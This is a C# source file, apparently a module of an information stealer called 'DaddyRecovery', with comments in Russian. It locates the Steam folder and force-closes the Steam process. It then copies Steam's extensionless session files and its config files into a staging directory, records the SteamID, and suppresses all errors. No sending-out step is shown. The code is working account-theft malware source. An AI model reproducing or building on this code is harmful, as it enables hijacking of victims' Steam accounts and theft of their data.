namespace DaddyRecovery.Applications.Steam
{
    using System;
    using System.IO;
    using System.Linq;
    using Helpers;

    public static class GetSteamFiles
    {
        /// <summary>
        /// Метод для сбора файлов со Steam директории
        /// </summary>
        /// <param name="exp">Сбор файлов без расширений ( *." )</param>
        /// <param name="congfiles">Сбор файлов с config директории</param>
        /// <param name="name">Именная папка Config</param>
        /// <param name="proc">Имя процесса Стим</param>
        public static void Inizialize(string exp, string congfiles, string name, string proc)
        {
            // Проверяем путь к папке стим
            if (CombineEx.ExistsDir(SteamPath.GetLocationSteam()))
            {
                CombineEx.CreateOrDeleteDirectoryEx(true, CombineEx.CombinePath(GlobalPath.Steam_Dir, name), FileAttributes.Normal);
                CombineEx.CreateFile(false, GlobalPath.SteamID, SteamProfiles.GetSteamID());

                // Закрываем процесс чтобы можно было скопировать файлы.
                ProcessControl.Closing(proc);
                try
                {
                    // Проходимся циклом по файлам без расширения
                    foreach (var Unknown in Directory.EnumerateFiles(SteamPath.GetLocationSteam(), exp).Where(
                    // Проверяем файл
                    Unknown => File.Exists(Unknown)).Where(
                    // Обходим файл .crash
                    Unknown => !Unknown.Contains(".crash")).Select(Unknown => Unknown))
                    {
                        CombineEx.FileCopy(Unknown, CombineEx.CombinePath(GlobalPath.Steam_Dir, CombineEx.GetFileName(Unknown)), true);
                    }
                    // Проходимся циклом по файлам конфиг
                    foreach (var Config in Directory.EnumerateFiles(CombineEx.CombinePath(SteamPath.GetLocationSteam(), name), congfiles).Where(
                    // Проверяем файл
                    Config => File.Exists(Config)).Select(Config => Config))
                    {
                        CombineEx.FileCopy(Config, CombineEx.CombinePath(CombineEx.CombinePath(GlobalPath.Steam_Dir, name), CombineEx.GetFileName(Config)), true);
                    }
                }
                catch { }
            }
        }
    }
}